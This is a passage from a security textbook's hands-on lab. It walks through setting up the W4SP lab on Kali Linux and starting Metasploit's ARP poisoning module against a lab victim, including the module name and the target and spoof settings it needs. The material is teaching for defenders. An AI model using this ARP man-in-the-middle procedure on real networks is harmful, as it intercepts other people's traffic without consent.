style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Launch your Kali Linux virtual</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >machine.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:16.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l5 level1 lfo13;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Log in as the user w4sp-lab. (If you don&#8217;t remember the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >password, you can reset it when logged in as</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >root.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.5500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l5 level1 lfo13;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >4.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In W4SP files directory, run the following lab</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.7000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >script:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >python w4sp_webapp.py</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once the Firefox browser comes up, you know the W4SP Lab is ready to work.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Remember: Do not close the Terminal window you ran the lab script from; if you do, the lab will stop.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After running SETUP to launch the lab environment, you may or may not see the center screen refresh with a full network, showing the devices. If only &#8220;Kali&#8221; is shown, click Refresh.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A network layout appears that resembles something like<a name="_bookmark380" ></a>&nbsp;</span><span><a href="#_bookmark382" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section196" ><p class=MsoBodyText  style="margin-left:19.2500pt;" ><img width="744"  height="623"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker255636.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark382" ></a><span><a href="#_bookmark380" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-3:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >W4SP Lab network</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The W4SP Lab is now ready for you, as we first set up in </span><span><a href="#_bookmark56" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A quick troubleshooting note: If you find that Wireshark does not work as the user w4sp-lab, giving the error </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Couldn't run</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >/usr/bin/dumpcap in child process: Permission Denied</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, then</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.5500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >type this one-liner in a separate Terminal window:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sudo setcap 'CAP_NET_RAW+eip CAP_NET_ADMIN+eip' /user/bin/dumpcap</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Running that </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >setcap</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command lets dumpcap access raw sockets and do admin stuff to the network stack without requiring you to run as root.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:15.0000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Starting Metasploit</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section197" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In this lab you are using Metasploit, a wonderfully powerful framework of modules to deliver payloads or perform exploits on systems in your lab environment. While this book is far from covering how versatile Metasploit is, we&#8217;ll say the framework is capable enough to handle every scenario we need to demonstrate.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Normally, to launch Metasploit framework, you can either click the blue M icon on the Kali desktop sidebar or type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >msfconsole </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in a new Terminal window. For this lab, however, </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >you are required to run as root</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. At a Terminal prompt, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >sudo msfconsole</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. You should see a new prompt &#8220;msf &#62;&#8221;, waiting for your command.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you are familiar with Metasploit, excellent. If not, know these two things:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-left:30.5000pt;line-height:145%;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.5833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker256967.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:64.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker256968.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The &#8220;msf &#62;&#8221; prompt is the tool&#8217;s command line interface (CLI). Typing </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >? </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >or </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >help </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >at that prompt will present the help menu.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Metasploit is a tool with several modules, which, once used, will change the prompt to include that module. Using a module will enable other commands that we demonstrate in this lab walkthrough.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Starting the W4SP ARP MitM Attack</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoNormal  style="margin-top:7.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark383" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >At the Metasploit CLI, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >use auxiliary/spoof/arp/arp_poisoning</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Like at a Terminal prompt, you can press Tab to autofill commands you&#8217;ve started. For example, pressing Tab at &#8220;use aux&#8221; will autofill to &#8220;use auxiliary/&#8221;, and so on for subsequent directories or modules.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Given that module is now in use, note the msf prompt changed. The msf prompt shows that the ARP poisoning module is in play. For this module to function, several settings are required before the exploit can be used. To see a module&#8217;s settings, required or not, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >show options</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note especially the settings that are required but do not yet have a current setting&#8212;namely, DHOSTS (the target IP address) and SHOSTS (the spoofed IP address). These are two settings you need to configure before you can launch the exploit. There is also a third</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section198" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >setting, LOCALSIP (the local IP address), found under &#8220;show advanced&#8221; that also must be set. While the module doesn&#8217;t require the LOCALSIP option, you need to manually set it to ensure the lab works properly.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To set all three of these settings, you need to identify the IP addresses of all involved systems.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="252"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker258445.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:5.8000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For the gateway IP address, open another Terminal window and run </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sudo route -n</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to verify the gateway&#8217;s IP address. Running </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sudo arp -a </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >will provide its MAC address. (We don&#8217;t need it, but it&#8217;s good to know for verifying in Wireshark).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To get the local system&#8217;s IP address, you can run </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sudo ifconfig</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to determine the local (</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >w4sp_lab</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) interface IP.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Vic1 is a W4SP system that is intended as a victim. To get vic1&#8217;s IP address, there are several ways as well. One way is to ping vic1&#8212;you&#8217;ll see vic1.labs resolves to (in this case) 192.100.200.193. Another way is to check the browser&#8217;s dynamic network diagram. Hovering over vic1 will present the IP address, as shown in<a name="_bookmark384" ></a>&nbsp;</span><span><a href="#_bookmark386" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section199" ><p class=MsoBodyText  style="margin-left:34.2500pt;" ><img width="694"  height="519"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker259161.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark386" ></a><span><a href="#_bookmark384" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-4:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >W4SP&#8217;s vic1</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><a name="_bookmark387" ></a><span><a href="#_bookmark388" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 5-1</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows three options for the exploit module in Metasploit. As mentioned above, these options are required to execute the attack.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:10.6000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark388" ></a><span><a href="#_bookmark387" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Table 5-1:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Exploit Options</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><table class=MsoNormalTable  border=1  cellspacing=0  style="border-collapse:collapse;width:467.6500pt;margin-left:14.4000pt;mso-table-layout-alt:fixed;border:none;mso-border-left-alt:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);mso-border-insideh:1.0000pt solid rgb(191,191,191);mso-border-insidev:1.0000pt solid rgb(191,191,191);mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:21.5000pt;" ><td width=130  valign=top  style="width:78.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >SETTING</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td><td width=200  valign=top  style="width:120.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >DESCRIPTION</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td><td width=183  valign=top  style="width:110.2500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >SYSTEM</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td><td width=193  valign=top  style="width:116.2500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >IP ADDRESS</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td><td width=71  valign=top  style="width:43.1500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;mso-border-left-alt:none;border-right:none;mso-border-right-alt:none;border-top:1.0000pt solid rgb(191,191,191);mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" >MAC</span></b><b><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></td></tr><tr style="height:21.5000pt;" ><td width=130  valign=top  style="width:78.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:1.0000pt solid rgb(191,191,191);mso-border-left-alt:1.0000pt solid rgb(191,191,191);border-right:1.0000pt solid rgb(191,191,191);mso-border-right-alt:1.0000pt solid rgb(191,191,191);border-top:none;mso-border-top-alt:1.0000pt solid rgb(191,191,191);border-bottom:1.0000pt solid rgb(191,191,191);mso-border-bottom-alt:1.0000pt solid rgb(191,191,191);" ><p class=18  style="margin-top:1.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" >DHOSTS</span><span style="font-family:Georgia;mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:15.0000pt;" ><o:p></o:p></span></p></td><td width=200  valign=top  style="width:120.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt 